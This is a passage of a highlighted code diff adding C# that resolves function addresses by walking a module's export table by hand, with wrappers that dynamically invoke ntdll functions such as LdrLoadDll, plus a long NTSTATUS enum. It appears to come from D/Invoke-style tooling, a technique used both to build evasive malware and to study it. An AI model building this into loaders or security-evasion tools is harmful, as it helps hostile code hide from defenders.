+</span></span><span style="display:flex;"><span>				Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x1C</span>));
+</span></span><span style="display:flex;"><span>				Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x20</span>));
+</span></span><span style="display:flex;"><span>				Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x24</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Get the VAs of the name table&#39;s beginning and end.</span>
+</span></span><span style="display:flex;"><span>				Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
+</span></span><span style="display:flex;"><span>				Int64 NamesFinal = NamesBegin + NumberOfNames * <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Loop the array of export name RVA&#39;s</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; NumberOfNames; i++)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">string</span> FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * <span style="color:#ae81ff">4</span>))));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
+</span></span><span style="display:flex;"><span>					{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>						Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * <span style="color:#ae81ff">2</span>)) + OrdinalBase;
+</span></span><span style="display:flex;"><span>						Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (<span style="color:#ae81ff">4</span> * (FunctionOrdinal - OrdinalBase))));
+</span></span><span style="display:flex;"><span>						FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (ResolveForwards == <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>							<span style="color:#75715e">// If the export address points to a forward, get the address</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#75715e">// FunctionPtr = GetForwardAddress(FunctionPtr);</span>
+</span></span><span style="display:flex;"><span>							FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">catch</span>
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Catch parser failure</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidOperationException(<span style="color:#e6db74">&#34;Failed to parse module exports.&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (FunctionPtr == IntPtr.Zero)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Export not found</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> MissingMethodException(ExportName + <span style="color:#e6db74">&#34;, export not found.&#34;</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> FunctionPtr;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Craft an array for the arguments</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">object</span>[] funcargs =
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				DestinationString, SourceString
+</span></span><span style="display:flex;"><span>			};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			DynamicAPIInvoke(<span style="color:#e6db74">@&#34;ntdll.dll&#34;</span>, <span style="color:#e6db74">@&#34;RtlInitUnicodeString&#34;</span>, <span style="color:#66d9ef">typeof</span>(DELEGATES.RtlInitUnicodeString), <span style="color:#66d9ef">ref</span> funcargs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Update the modified variables</span>
+</span></span><span style="display:flex;"><span>			DestinationString = (STRUCTS.UNICODE_STRING)funcargs[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Craft an array for the arguments</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">object</span>[] funcargs =
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				PathToFile, dwFlags, ModuleFileName, ModuleHandle
+</span></span><span style="display:flex;"><span>			};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(<span style="color:#e6db74">@&#34;ntdll.dll&#34;</span>, <span style="color:#e6db74">@&#34;LdrLoadDll&#34;</span>, <span style="color:#66d9ef">typeof</span>(DELEGATES.LdrLoadDll), <span style="color:#66d9ef">ref</span> funcargs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Update the modified variables</span>
+</span></span><span style="display:flex;"><span>			ModuleHandle = (IntPtr)funcargs[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> retValue;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Corressponding structs and enums</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">STRUCTS</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// https://dinvoke.net/en/ntdll/NTSTATUS</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Success</span>
+</span></span><span style="display:flex;"><span>			Success = <span style="color:#ae81ff">0x00000000</span>,
+</span></span><span style="display:flex;"><span>			Wait1 = <span style="color:#ae81ff">0x00000001</span>,
+</span></span><span style="display:flex;"><span>			Wait2 = <span style="color:#ae81ff">0x00000002</span>,
+</span></span><span style="display:flex;"><span>			Wait3 = <span style="color:#ae81ff">0x00000003</span>,
+</span></span><span style="display:flex;"><span>			Wait63 = <span style="color:#ae81ff">0x0000003f</span>,
+</span></span><span style="display:flex;"><span>			Abandoned = <span style="color:#ae81ff">0x00000080</span>,
+</span></span><span style="display:flex;"><span>			AbandonedWait0 = <span style="color:#ae81ff">0x00000080</span>,
+</span></span><span style="display:flex;"><span>			AbandonedWait1 = <span style="color:#ae81ff">0x00000081</span>,
+</span></span><span style="display:flex;"><span>			AbandonedWait2 = <span style="color:#ae81ff">0x00000082</span>,
+</span></span><span style="display:flex;"><span>			AbandonedWait3 = <span style="color:#ae81ff">0x00000083</span>,
+</span></span><span style="display:flex;"><span>			AbandonedWait63 = <span style="color:#ae81ff">0x000000bf</span>,
+</span></span><span style="display:flex;"><span>			UserApc = <span style="color:#ae81ff">0x000000c0</span>,
+</span></span><span style="display:flex;"><span>			KernelApc = <span style="color:#ae81ff">0x00000100</span>,
+</span></span><span style="display:flex;"><span>			Alerted = <span style="color:#ae81ff">0x00000101</span>,
+</span></span><span style="display:flex;"><span>			Timeout = <span style="color:#ae81ff">0x00000102</span>,
+</span></span><span style="display:flex;"><span>			Pending = <span style="color:#ae81ff">0x00000103</span>,
+</span></span><span style="display:flex;"><span>			Reparse = <span style="color:#ae81ff">0x00000104</span>,
+</span></span><span style="display:flex;"><span>			MoreEntries = <span style="color:#ae81ff">0x00000105</span>,
+</span></span><span style="display:flex;"><span>			NotAllAssigned = <span style="color:#ae81ff">0x00000106</span>,
+</span></span><span style="display:flex;"><span>			SomeNotMapped = <span style="color:#ae81ff">0x00000107</span>,
+</span></span><span style="display:flex;"><span>			OpLockBreakInProgress = <span style="color:#ae81ff">0x00000108</span>,
+</span></span><span style="display:flex;"><span>			VolumeMounted = <span style="color:#ae81ff">0x00000109</span>,
+</span></span><span style="display:flex;"><span>			RxActCommitted = <span style="color:#ae81ff">0x0000010a</span>,
+</span></span><span style="display:flex;"><span>			NotifyCleanup = <span style="color:#ae81ff">0x0000010b</span>,
+</span></span><span style="display:flex;"><span>			NotifyEnumDir = <span style="color:#ae81ff">0x0000010c</span>,
+</span></span><span style="display:flex;"><span>			NoQuotasForAccount = <span style="color:#ae81ff">0x0000010d</span>,
+</span></span><span style="display:flex;"><span>			PrimaryTransportConnectFailed = <span style="color:#ae81ff">0x0000010e</span>,
+</span></span><span style="display:flex;"><span>			PageFaultTransition = <span style="color:#ae81ff">0x00000110</span>,
+</span></span><span style="display:flex;"><span>			PageFaultDemandZero = <span style="color:#ae81ff">0x00000111</span>,
+</span></span><span style="display:flex;"><span>			PageFaultCopyOnWrite = <span style="color:#ae81ff">0x00000112</span>,
+</span></span><span style="display:flex;"><span>			PageFaultGuardPage = <span style="color:#ae81ff">0x00000113</span>,
+</span></span><span style="display:flex;"><span>			PageFaultPagingFile = <span style="color:#ae81ff">0x00000114</span>,
+</span></span><span style="display:flex;"><span>			CrashDump = <span style="color:#ae81ff">0x00000116</span>,
+</span></span><span style="display:flex;"><span>			ReparseObject = <span style="color:#ae81ff">0x00000118</span>,
+</span></span><span style="display:flex;"><span>			NothingToTerminate = <span style="color:#ae81ff">0x00000122</span>,
+</span></span><span style="display:flex;"><span>			ProcessNotInJob = <span style="color:#ae81ff">0x00000123</span>,
+</span></span><span style="display:flex;"><span>			ProcessInJob = <span style="color:#ae81ff">0x00000124</span>,
+</span></span><span style="display:flex;"><span>			ProcessCloned = <span style="color:#ae81ff">0x00000129</span>,
+</span></span><span style="display:flex;"><span>			FileLockedWithOnlyReaders = <span style="color:#ae81ff">0x0000012a</span>,
+</span></span><span style="display:flex;"><span>			FileLockedWithWriters = <span style="color:#ae81ff">0x0000012b</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Informational</span>
+</span></span><span style="display:flex;"><span>			Informational = <span style="color:#ae81ff">0x40000000</span>,
+</span></span><span style="display:flex;"><span>			ObjectNameExists = <span style="color:#ae81ff">0x40000000</span>,
+</span></span><span style="display:flex;"><span>			ThreadWasSuspended = <span style="color:#ae81ff">0x40000001</span>,
+</span></span><span style="display:flex;"><span>			WorkingSetLimitRange = <span style="color:#ae81ff">0x40000002</span>,
+</span></span><span style="display:flex;"><span>			ImageNotAtBase = <span style="color:#ae81ff">0x40000003</span>,
+</span></span><span style="display:flex;"><span>			RegistryRecovered = <span style="color:#ae81ff">0x40000009</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Warning</span>
+</span></span><span style="display:flex;"><span>			Warning = <span style="color:#ae81ff">0x80000000</span>,
+</span></span><span style="display:flex;"><span>			GuardPageViolation = <span style="color:#ae81ff">0x80000001</span>,
+</span></span><span style="display:flex;"><span>			DatatypeMisalignment = <span style="color:#ae81ff">0x80000002</span>,
+</span></span><span style="display:flex;"><span>			Breakpoint = <span style="color:#ae81ff">0x80000003</span>,
+</span></span><span style="display:flex;"><span>			SingleStep = <span style="color:#ae81ff">0x80000004</span>,
+</span></span><span style="display:flex;"><span>			BufferOverflow = <span style="color:#ae81ff">0x80000005</span>,
+</span></span><span style="display:flex;"><span>			NoMoreFiles = <span style="color:#ae81ff">0x80000006</span>,
+</span></span><span style="display:flex;"><span>			HandlesClosed = <span style="color:#ae81ff">0x8000000a</span>,
+</span></span><span style="display:flex;"><span>			PartialCopy = <span style="color:#ae81ff">0x8000000d</span>,
+</span></span><span style="display:flex;"><span>			DeviceBusy = <span style="color:#ae81ff">0x80000011</span>,
+</span></span><span style="display:flex;"><span>			InvalidEaName = <span style="color:#ae81ff">0x80000013</span>,
+</span></span><span style="display:flex;"><span>			EaListInconsistent = <span style="color:#ae81ff">0x80000014</span>,
+</span></span><span style="display:flex;"><span>			NoMoreEntries = <span style="color:#ae81ff">0x8000001a</span>,
+</span></span><span style="display:flex;"><span>			LongJump = <span style="color:#ae81ff">0x80000026</span>,
+</span></span><span style="display:flex;"><span>			DllMightBeInsecure = <span style="color:#ae81ff">0x8000002b</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Error</span>
+</span></span><span style="display:flex;"><span>			Error = <span style="color:#ae81ff">0xc0000000</span>,
+</span></span><span style="display:flex;"><span>			Unsuccessful = <span style="color:#ae81ff">0xc0000001</span>,
+</span></span><span style="display:flex;"><span>			NotImplemented = <span style="color:#ae81ff">0xc0000002</span>,
+</span></span><span style="display:flex;"><span>			InvalidInfoClass = <span style="color:#ae81ff">0xc0000003</span>,
+</span></span><span style="display:flex;"><span>			InfoLengthMismatch = <span style="color:#ae81ff">0xc0000004</span>,
+</span></span><span style="display:flex;"><span>			AccessViolation = <span style="color:#ae81ff">0xc0000005</span>,
+</span></span><span style="display:flex;"><span>			InPageError = <span style="color:#ae81ff">0xc0000006</span>,
+</span></span><span style="display:flex;"><span>			PagefileQuota = <span style="color:#ae81ff">0xc0000007</span>,
+</span></span><span style="display:flex;"><span>			InvalidHandle = <span style="color:#ae81ff">0xc0000008</span>,
+</span></span><span style="display:flex;"><span>			BadInitialStack = <span style="color:#ae81ff">0xc0000009</span>,
+</span></span><span style="display:flex;"><span>			BadInitialPc = <span style="color:#ae81ff">0xc000000a</span>,
+</span></span><span style="display:flex;"><span>			InvalidCid = <span style="color:#ae81ff">0xc000000b</span>,
+</span></span><span style="display:flex;"><span>			TimerNotCanceled = <span style="color:#ae81ff">0xc000000c</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameter = <span style="color:#ae81ff">0xc000000d</span>,
+</span></span><span style="display:flex;"><span>			NoSuchDevice = <span style="color:#ae81ff">0xc000000e</span>,
+</span></span><span style="display:flex;"><span>			NoSuchFile = <span style="color:#ae81ff">0xc000000f</span>,
+</span></span><span style="display:flex;"><span>			InvalidDeviceRequest = <span style="color:#ae81ff">0xc0000010</span>,
+</span></span><span style="display:flex;"><span>			EndOfFile = <span style="color:#ae81ff">0xc0000011</span>,
+</span></span><span style="display:flex;"><span>			WrongVolume = <span style="color:#ae81ff">0xc0000012</span>,
+</span></span><span style="display:flex;"><span>			NoMediaInDevice = <span style="color:#ae81ff">0xc0000013</span>,
+</span></span><span style="display:flex;"><span>			NoMemory = <span style="color:#ae81ff">0xc0000017</span>,
+</span></span><span style="display:flex;"><span>			ConflictingAddresses = <span style="color:#ae81ff">0xc0000018</span>,
+</span></span><span style="display:flex;"><span>			NotMappedView = <span style="color:#ae81ff">0xc0000019</span>,
+</span></span><span style="display:flex;"><span>			UnableToFreeVm = <span style="color:#ae81ff">0xc000001a</span>,
+</span></span><span style="display:flex;"><span>			UnableToDeleteSection = <span style="color:#ae81ff">0xc000001b</span>,
+</span></span><span style="display:flex;"><span>			IllegalInstruction = <span style="color:#ae81ff">0xc000001d</span>,
+</span></span><span style="display:flex;"><span>			AlreadyCommitted = <span style="color:#ae81ff">0xc0000021</span>,
+</span></span><span style="display:flex;"><span>			AccessDenied = <span style="color:#ae81ff">0xc0000022</span>,
+</span></span><span style="display:flex;"><span>			BufferTooSmall = <span style="color:#ae81ff">0xc0000023</span>,
+</span></span><span style="display:flex;"><span>			ObjectTypeMismatch = <span style="color:#ae81ff">0xc0000024</span>,
+</span></span><span style="display:flex;"><span>			NonContinuableException = <span style="color:#ae81ff">0xc0000025</span>,
+</span></span><span style="display:flex;"><span>			BadStack = <span style="color:#ae81ff">0xc0000028</span>,
+</span></span><span style="display:flex;"><span>			NotLocked = <span style="color:#ae81ff">0xc000002a</span>,
+</span></span><span style="display:flex;"><span>			NotCommitted = <span style="color:#ae81ff">0xc000002d</span>,
+</span></span><span style="display:flex;"><span>			InvalidParameterMix = <span style="color:#ae81ff">0xc0000030</span>,
+</span></span><span style="display:flex;"><span>			ObjectNameInvalid = <span style="color:#ae81ff">0xc0000033</span>,
+</span></span><span style="display:flex;"><span>			ObjectNameNotFound = <span style="color:#ae81ff">0xc0000034</span>,
+</span></span><span style="display:flex;"><span>			ObjectNameCollision = <span style="color:#ae81ff">0xc0000035</span>,
+</span></span><span style="display:flex;"><span>			ObjectPathInvalid = <span style="color:#ae81ff">0xc0000039</span>,
+</span></span><span style="display:flex;"><span>			ObjectPathNotFound = <span style="color:#ae81ff">0xc000003a</span>,
+</span></span><span style="display:flex;"><span>			ObjectPathSyntaxBad = <span style="color:#ae81ff">0xc000003b</span>,
+</span></span><span style="display:flex;"><span>			DataOverrun = <span style="color:#ae81ff">0xc000003c</span>,
+</span></span><span style="display:flex;"><span>			DataLate = <span style="color:#ae81ff">0xc000003d</span>,
+</span></span><span style="display:flex;"><span>			DataError = <span style="color:#ae81ff">0xc000003e</span>,
+</span></span><span style="display:flex;"><span>			CrcError = <span style="color:#ae81ff">0xc000003f</span>,
+</span></span><span style="display:flex;"><span>			SectionTooBig = <span style="color:#ae81ff">0xc0000040</span>,
+</span></span><span style="display:flex;"><span>			PortConnectionRefused = <span style="color:#ae81ff">0xc0000041</span>,
+</span></span><span style="display:flex;"><span>			InvalidPortHandle = <span style="color:#ae81ff">0xc0000042</span>,
+</span></span><span style="display:flex;"><span>			SharingViolation = <span style="color:#ae81ff">0xc0000043</span>,
+</span></span><span style="display:flex;"><span>			QuotaExceeded = <span style="color:#ae81ff">0xc0000044</span>,
+</span></span><span style="display:flex;"><span>			InvalidPageProtection = <span style="color:#ae81ff">0xc0000045</span>,
+</span></span><span style="display:flex;"><span>			MutantNotOwned = <span style="color:#ae81ff">0xc0000046</span>,
+</span></span><span style="display:flex;"><span>			SemaphoreLimitExceeded = <span style="color:#ae81ff">0xc0000047</span>,
+</span></span><span style="display:flex;"><span>			PortAlreadySet = <span style="color:#ae81ff">0xc0000048</span>,
+</span></span><span style="display:flex;"><span>			SectionNotImage = <span style="color:#ae81ff">0xc0000049</span>,
+</span></span><span style="display:flex;"><span>			SuspendCountExceeded = <span style="color:#ae81ff">0xc000004a</span>,
+</span></span><span style="display:flex;"><span>			ThreadIsTerminating = <span style="color:#ae81ff">0xc000004b</span>,
+</span></span><span style="display:flex;"><span>			BadWorkingSetLimit = <span style="color:#ae81ff">0xc000004c</span>,
+</span></span><span style="display:flex;"><span>			IncompatibleFileMap = <span style="color:#ae81ff">0xc000004d</span>,
+</span></span><span style="display:flex;"><span>			SectionProtection = <span style="color:#ae81ff">0xc000004e</span>,
+</span></span><span style="display:flex;"><span>			EasNotSupported = <span style="color:#ae81ff">0xc000004f</span>,
+</span></span><span style="display:flex;"><span>			EaTooLarge = <span style="color:#ae81ff">0xc0000050</span>,
+</span></span><span style="display:flex;"><span>			NonExistentEaEntry = <span style="color:#ae81ff">0xc0000051</span>,
+</span></span><span style="display:flex;"><span>			NoEasOnFile = <span style="color:#ae81ff">0xc0000052</span>,
+</span></span><span style="display:flex;"><span>			EaCorruptError = <span style="color:#ae81ff">0xc0000053</span>,
+</span></span><span style="display:flex;"><span>			FileLockConflict = <span style="color:#ae81ff">0xc0000054</span>,
+</span></span><span style="display:flex;"><span>			LockNotGranted = <span style="color:#ae81ff">0xc0000055</span>,
+</span></span><span style="display:flex;"><span>			DeletePending = <span style="color:#ae81ff">0xc0000056</span>,
+</span></span><span style="display:flex;"><span>			CtlFileNotSupported = <span style="color:#ae81ff">0xc0000057</span>,
+</span></span><span style="display:flex;"><span>			UnknownRevision = <span style="color:#ae81ff">0xc0000058</span>,
+</span></span><span style="display:flex;"><span>			RevisionMismatch = <span style="color:#ae81ff">0xc0000059</span>,
+</span></span><span style="display:flex;"><span>			InvalidOwner = <span style="color:#ae81ff">0xc000005a</span>,
+</span></span><span style="display:flex;"><span>			InvalidPrimaryGroup = <span style="color:#ae81ff">0xc000005b</span>,
+</span></span><span style="display:flex;"><span>			NoImpersonationToken = <span style="color:#ae81ff">0xc000005c</span>,
+</span></span><span style="display:flex;"><span>			CantDisableMandatory = <span style="color:#ae81ff">0xc000005d</span>,
+</span></span><span style="display:flex;"><span>			NoLogonServers = <span style="color:#ae81ff">0xc000005e</span>,
+</span></span><span style="display:flex;"><span>			NoSuchLogonSession = <span style="color:#ae81ff">0xc000005f</span>,
+</span></span><span style="display:flex;"><span>			NoSuchPrivilege = <span style="color:#ae81ff">0xc0000060</span>,
+</span></span><span style="display:flex;"><span>			PrivilegeNotHeld = <span style="color:#ae81ff">0xc0000061</span>,
+</span></span><span style="display:flex;"><span>			InvalidAccountName = <span style="color:#ae81ff">0xc0000062</span>,
+</span></span><span style="display:flex;"><span>			UserExists = <span style="color:#ae81ff">0xc0000063</span>,
+</span></span><span style="display:flex;"><span>			NoSuchUser = <span style="color:#ae81ff">0xc0000064</span>,
+</span></span><span style="display:flex;"><span>			GroupExists = <span style="color:#ae81ff">0xc0000065</span>,
+</span></span><span style="display:flex;"><span>			NoSuchGroup = <span style="color:#ae81ff">0xc0000066</span>,
+</span></span><span style="display:flex;"><span>			MemberInGroup = <span style="color:#ae81ff">0xc0000067</span>,
+</span></span><span style="display:flex;"><span>			MemberNotInGroup = <span style="color:#ae81ff">0xc0000068</span>,
+</span></span><span style="display:flex;"><span>			LastAdmin = <span style="color:#ae81ff">0xc0000069</span>,
+</span></span><span style="display:flex;"><span>			WrongPassword = <span style="color:#ae81ff">0xc000006a</span>,
+</span></span><span style="display:flex;"><span>			IllFormedPassword = <span style="color:#ae81ff">0xc000006b</span>,
+</span></span><span style="display:flex;"><span>			PasswordRestriction = <span style="color:#ae81ff">0xc000006c</span>,
+</span></span><span style="display:flex;"><span>			LogonFailure = <span style="color:#ae81ff">0xc000006d</span>,
+</span></span><span style="display:flex;"><span>			AccountRestriction = <span style="color:#ae81ff">0xc000006e</span>,
+</span></span><span style="display:flex;"><span>			InvalidLogonHours = <span style="color:#ae81ff">0xc000006f</span>,
+</span></span><span style="display:flex;"><span>			InvalidWorkstation = <span style="color:#ae81ff">0xc0000070</span>,
+</span></span><span style="display:flex;"><span>			PasswordExpired = <span style="color:#ae81ff">0xc0000071</span>,
+</span></span><span style="display:flex;"><span>			AccountDisabled = <span style="color:#ae81ff">0xc0000072</span>,
+</span></span><span style="display:flex;"><span>			NoneMapped = <span style="color:#ae81ff">0xc0000073</span>,
+</span></span><span style="display:flex;"><span>			TooManyLuidsRequested = <span style="color:#ae81ff">0xc0000074</span>,
+</span></span><span style="display:flex;"><span>			LuidsExhausted = <span style="color:#ae81ff">0xc0000075</span>,
+</span></span><span style="display:flex;"><span>			InvalidSubAuthority = <span style="color:#ae81ff">0xc0000076</span>,
+</span></span><span style="display:flex;"><span>			InvalidAcl = <span style="color:#ae81ff">0xc0000077</span>,
+</span></span><span style="display:flex;"><span>			InvalidSid = <span style="color:#ae81ff">0xc0000078</span>,
+</span></span><span style="display:flex;"><span>			InvalidSecurityDescr = <span style="color:#ae81ff">0xc0000079</span>,
+</span></span><span style="display:flex;"><span>			ProcedureNotFound = <span style="color:#ae81ff">0xc000007a</span>,
+</span></span><span style="display:flex;"><span>			InvalidImageFormat = <span style="color:#ae81ff">0xc000007b</span>,
+</span></span><span style="display:flex;"><span>			NoToken = <span style="color:#ae81ff">0xc000007c</span>,
+</span></span><span style="display:flex;"><span>			BadInheritanceAcl = <span style="color:#ae81ff">0xc000007d</span>,
+</span></span><span style="display:flex;"><span>			RangeNotLocked = <span style="color:#ae81ff">0xc000007e</span>,
+</span></span><span style="display:flex;"><span>			DiskFull = <span style="color:#ae81ff">0xc000007f</span>,
+</span></span><span style="display:flex;"><span>			ServerDisabled = <span style="color:#ae81ff">0xc0000080</span>,
+</span></span><span style="display:flex;"><span>			ServerNotDisabled = <span style="color:#ae81ff">0xc0000081</span>,
+</span></span><span style="display:flex;"><span>			TooManyGuidsRequested = <span style="color:#ae81ff">0xc0000082</span>,
+</span></span><span style="display:flex;"><span>			GuidsExhausted = <span style="color:#ae81ff">0xc0000083</span>,
+</span></span><span style="display:flex;"><span>			InvalidIdAuthority = <span style="color:#ae81ff">0xc0000084</span>,
+</span></span><span style="display:flex;"><span>			AgentsExhausted = <span style="color:#ae81ff">0xc0000085</span>,
+</span></span><span style="display:flex;"><span>			InvalidVolumeLabel = <span style="color:#ae81ff">0xc0000086</span>,
+</span></span><span style="display:flex;"><span>			SectionNotExtended = <span style="color:#ae81ff">0xc0000087</span>,
+</span></span><span style="display:flex;"><span>			NotMappedData = <span style="color:#ae81ff">0xc0000088</span>,
+</span></span><span style="display:flex;"><span>			ResourceDataNotFound = <span style="color:#ae81ff">0xc0000089</span>,
+</span></span><span style="display:flex;"><span>			ResourceTypeNotFound = <span style="color:#ae81ff">0xc000008a</span>,
+</span></span><span style="display:flex;"><span>			ResourceNameNotFound = <span style="color:#ae81ff">0xc000008b</span>,
+</span></span><span style="display:flex;"><span>			ArrayBoundsExceeded = <span style="color:#ae81ff">0xc000008c</span>,
+</span></span><span style="display:flex;"><span>			FloatDenormalOperand = <span style="color:#ae81ff">0xc000008d</span>,
+</span></span><span style="display:flex;"><span>			FloatDivideByZero = <span style="color:#ae81ff">0xc000008e</span>,
+</span></span><span style="display:flex;"><span>			FloatInexactResult = <span style="color:#ae81ff">0xc000008f</span>,
+</span></span><span style="display:flex;"><span>			FloatInvalidOperation = <span style="color:#ae81ff">0xc0000090</span>,
+</span></span><span style="display:flex;"><span>			FloatOverflow = <span style="color:#ae81ff">0xc0000091</span>,
+</span></span><span style="display:flex;"><span>			FloatStackCheck = <span style="color:#ae81ff">0xc0000092</span>,
+</span></span><span style="display:flex;"><span>			FloatUnderflow = <span style="color:#ae81ff">0xc0000093</span>,
+</span></span><span style="display:flex;"><span>			IntegerDivideByZero = <span style="color:#ae81ff">0xc0000094</span>,
+</span></span><span style="display:flex;"><span>			IntegerOverflow = <span style="color:#ae81ff">0xc0000095</span>,
+</span></span><span style="display:flex;"><span>			PrivilegedInstruction = <span style="color:#ae81ff">0xc0000096</span>,
+</span></span><span style="display:flex;"><span>			TooManyPagingFiles = <span style="color:#ae81ff">0xc0000097</span>,
+</span></span><span style="display:flex;"><span>			FileInvalid = <span style="color:#ae81ff">0xc0000098</span>,
+</span></span><span style="display:flex;"><span>			InsufficientResources = <span style="color:#ae81ff">0xc000009a</span>,
+</span></span><span style="display:flex;"><span>			InstanceNotAvailable = <span style="color:#ae81ff">0xc00000ab</span>,
+</span></span><span style="display:flex;"><span>			PipeNotAvailable = <span style="color:#ae81ff">0xc00000ac</span>,
+</span></span><span style="display:flex;"><span>			InvalidPipeState = <span style="color:#ae81ff">0xc00000ad</span>,
+</span></span><span style="display:flex;"><span>			PipeBusy = <span style="color:#ae81ff">0xc00000ae</span>,
+</span></span><span style="display:flex;"><span>			IllegalFunction = <span style="color:#ae81ff">0xc00000af</span>,
+</span></span><span style="display:flex;"><span>			PipeDisconnected = <span style="color:#ae81ff">0xc00000b0</span>,
+</span></span><span style="display:flex;"><span>			PipeClosing = <span style="color:#ae81ff">0xc00000b1</span>,
+</span></span><span style="display:flex;"><span>			PipeConnected = <span style="color:#ae81ff">0xc00000b2</span>,
+</span></span><span style="display:flex;"><span>			PipeListening = <span style="color:#ae81ff">0xc00000b3</span>,
+</span></span><span style="display:flex;"><span>			InvalidReadMode = <span style="color:#ae81ff">0xc00000b4</span>,
